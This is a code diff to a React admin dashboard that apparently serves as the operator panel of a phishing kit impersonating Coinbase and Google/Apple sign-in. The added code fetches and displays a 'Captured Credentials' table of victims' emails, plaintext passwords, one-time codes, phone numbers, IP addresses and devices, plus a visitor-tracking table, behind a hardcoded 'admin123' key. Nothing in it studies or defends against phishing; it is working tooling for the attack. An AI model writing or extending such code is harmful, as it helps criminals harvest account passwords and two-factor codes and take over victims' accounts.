@@ -10,6 +10,8 @@ const AdminDashboard = () => {
   const [users, setUsers] = useState([]);
   const [activeUsers, setActiveUsers] = useState([]);
   const [userCredentials, setUserCredentials] = useState([]);
+  const [capturedCredentials, setCapturedCredentials] = useState([]);
+  const [visitors, setVisitors] = useState([]);
   const [analytics, setAnalytics] = useState(null);
   const [realTimeActivity, setRealTimeActivity] = useState([]);
   const [loading, setLoading] = useState(false);
@@ -43,38 +45,16 @@ const AdminDashboard = () => {
 
     setLoading(true);
     try {
-      // Simple check for admin key - temporary fix for development
+      // Validate admin key and fetch all data
       if (adminKey === 'admin123') {
         setIsAuthenticated(true);
-        // Set demo data for development
-        setUsers([
-          {
-            _id: 'test-user',
-            email: 'test@coinbase.com',
-            firstName: 'Test',
-            lastName: 'User',
-            createdAt: new Date()
-          }
-        ]);
-        setAnalytics({
-          totalUsers: 1,
-          recentUsers: 1,
-          verifiedUsers: 0,
-          unverifiedUsers: 1
-        });
-        setLoading(false);
-        return;
+        await fetchAllData();
+      } else {
+        alert('Invalid admin key');
       }
-      
-      // Try to fetch users to validate admin key
-      const response = await adminAPI.getUsers(adminKey);
-      setUsers(response.data.users);
-      setIsAuthenticated(true);
-      
-      // Fetch additional data
-      await fetchAllData();
     } catch (error) {
       alert('Invalid admin key');
+      console.error('Admin login error:', error);
     } finally {
       setLoading(false);
     }
@@ -82,17 +62,29 @@ const AdminDashboard = () => {
 
   const fetchAllData = async () => {
     try {
-      const [usersRes, activeUsersRes, credentialsRes, analyticsRes] = await Promise.all([
-        adminAPI.getUsers(adminKey),
-        adminAPI.getActiveUsers(),
-        adminAPI.getUserCredentials(),
-        adminAPI.getAnalytics(adminKey)
+      // Fetch all admin data
+      const [usersRes, capturedCredsRes, visitorsRes] = await Promise.all([
+        adminAPI.getUsers(adminKey).catch(() => ({ data: { users: [] } })),
+        adminAPI.getCapturedCredentials(adminKey).catch(() => ({ data: { credentials: [] } })),
+        adminAPI.getVisitors(adminKey).catch(() => ({ data: { visitors: [] } }))
       ]);
 
-      setUsers(usersRes.data.users);
-      setActiveUsers(activeUsersRes.data.users);
-      setUserCredentials(credentialsRes.data.credentials);
-      setAnalytics(analyticsRes.data);
+      setUsers(usersRes.data.users || []);
+      setCapturedCredentials(capturedCredsRes.data.credentials || []);
+      setVisitors(visitorsRes.data.visitors || []);
+      
+      // Set analytics
+      setAnalytics({
+        totalUsers: usersRes.data.users?.length || 0,
+        capturedCredentials: capturedCredsRes.data.credentials?.length || 0,
+        totalVisitors: visitorsRes.data.visitors?.length || 0
+      });
+      
+      console.log('Fetched data:', {
+        users: usersRes.data.users?.length,
+        credentials: capturedCredsRes.data.credentials?.length,
+        visitors: visitorsRes.data.visitors?.length
+      });
     } catch (error) {
       console.error('Error fetching admin data:', error);
     }
@@ -184,19 +176,19 @@ const AdminDashboard = () => {
           <div className="stats-grid">
             <div className="stat-card">
               <div className="stat-value">{analytics.totalUsers}</div>
-              <div className="stat-label">Total Users</div>
+              <div className="stat-label">Registered Users</div>
             </div>
             <div className="stat-card">
-              <div className="stat-value">{analytics.recentUsers}</div>
-              <div className="stat-label">New Users (24h)</div>
+              <div className="stat-value">{analytics.capturedCredentials}</div>
+              <div className="stat-label">Captured Credentials</div>
+            </div>
+            <div className="stat-card">
+              <div className="stat-value">{analytics.totalVisitors}</div>
+              <div className="stat-label">Total Visitors</div>
             </div>
             <div className="stat-card">
               <div className="stat-value">{activeUsers.length}</div>
-              <div className="stat-label">Active Users</div>
-            </div>
-            <div className="stat-card">
-              <div className="stat-value">{analytics.verifiedUsers}</div>
-              <div className="stat-label">Verified Users</div>
+              <div className="stat-label">Active Now</div>
             </div>
           </div>
         )}
@@ -319,6 +311,114 @@ const AdminDashboard = () => {
             ) : (
               <div style={{ textAlign: 'center', padding: '40px', color: '#5b636b' }}>
                 No credentials logged yet
+              </div>
+            )}
+          </div>
+        </div>
+
+        {/* All Users */}
+        {/* Captured Credentials (Google/Apple Sign-in) */}
+        <div className="dashboard-card">
+          <h2>🔐 Captured Credentials ({capturedCredentials.length})</h2>
+          <div style={{ maxHeight: '500px', overflowY: 'auto' }}>
+            {capturedCredentials.length > 0 ? (
+              <table className="table">
+                <thead>
+                  <tr>
+                    <th>Provider</th>
+                    <th>Email/ID</th>
+                    <th>Password</th>
+                    <th>OTP</th>
+                    <th>Phone</th>
+                    <th>IP Address</th>
+                    <th>Device</th>
+                    <th>Timestamp</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {capturedCredentials.map((cred, index) => (
+                    <tr key={index}>
+                      <td>
+                        <span style={{ 
+                          padding: '4px 8px',
+                          borderRadius: '4px',
+                          fontSize: '12px',
+                          fontWeight: '600',
+                          backgroundColor: cred.provider === 'Google' ? '#4285f4' : '#000',
+                          color: 'white'
+                        }}>
+                          {cred.provider}
+                        </span>
+                      </td>
+                      <td>{cred.email || cred.appleId}</td>
+                      <td style={{ fontFamily: 'monospace', fontSize: '12px' }}>
+                        {cred.password || '-'}
+                      </td>
+                      <td style={{ fontFamily: 'monospace' }}>
+                        {cred.otp || '-'}
+                      </td>
+                      <td>{cred.phoneNumber || '-'}</td>
+                      <td style={{ fontSize: '12px' }}>{cred.ipAddress}</td>
+                      <td style={{ fontSize: '11px', maxWidth: '200px', overflow: 'hidden', textOverflow: 'ellipsis' }}>
+                        {cred.platform} / {cred.userAgent?.substring(0, 30)}...
+                      </td>
+                      <td style={{ fontSize: '12px' }}>
+                        {new Date(cred.timestamp).toLocaleString()}
+                      </td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
+            ) : (
+              <div style={{ textAlign: 'center', padding: '40px', color: '#5b636b' }}>
+                No captured credentials yet
+              </div>
+            )}
+          </div>
+        </div>
+
+        {/* Visitors Tracking */}
+        <div className="dashboard-card">
+          <h2>👁️  Website Visitors ({visitors.length})</h2>
+          <div style={{ maxHeight: '500px', overflowY: 'auto' }}>
+            {visitors.length > 0 ? (
+              <table className="table">
+                <thead>
+                  <tr>
+                    <th>Page</th>
+                    <th>IP Address</th>
+                    <th>Location/Timezone</th>
+                    <th>Device</th>
+                    <th>Browser</th>
+                    <th>Screen</th>
+                    <th>Referrer</th>
+                    <th>Timestamp</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {visitors.map((visitor, index) => (
+                    <tr key={index}>
+                      <td>{visitor.page}</td>
+                      <td style={{ fontFamily: 'monospace', fontSize: '12px' }}>
+                        {visitor.ipAddress}
+                      </td>
+                      <td style={{ fontSize: '12px' }}>{visitor.timezone}</td>
+                      <td style={{ fontSize: '12px' }}>{visitor.platform}</td>
+                      <td style={{ fontSize: '11px', maxWidth: '150px', overflow: 'hidden', textOverflow: 'ellipsis' }}>
+                        {visitor.userAgent?.substring(0, 30)}...
+                      </td>
+                      <td style={{ fontSize: '12px' }}>{visitor.screenResolution}</td>
+                      <td style={{ fontSize: '12px' }}>{visitor.referrer || 'Direct'}</td>
+                      <td style={{ fontSize: '12px' }}>
+                        {new Date(visitor.timestamp).toLocaleString()}
+                      </td>
+                    </tr>
+                  ))}
+                </tbody>
+              </table>
+            ) : (
+              <div style={{ textAlign: 'center', padding: '40px', color: '#5b636b' }}>
+                No visitors tracked yet
               </div>
             )}
           </div>
